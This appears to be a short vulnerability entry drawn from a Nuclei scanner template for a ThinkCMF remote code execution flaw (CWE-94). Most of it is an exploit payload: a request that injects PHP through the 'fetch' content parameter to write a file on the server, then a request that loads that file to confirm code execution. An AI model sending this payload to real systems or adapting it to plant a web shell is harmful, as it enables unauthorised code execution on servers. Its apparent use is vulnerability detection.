# Vulnerability: ThinkCMF - Remote Code Execution
**Classification:** CWE-94
**Source:** Nuclei Template (`thinkcmf-rce.yaml`)

## Description
ThinkCMF  is susceptible to a remote code execution vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /index.php?a=fetch&content={{url_encode('<?php file_put_contents(\"{{randstr}}.php\",\"<?php echo md5(\"{{string}}\");unlink(__FILE__);\");')}} HTTP/1.1
Host: {{Hostname}}

GET /{{randstr}}.php HTTP/1.1
Host: {{Hostname}}
```

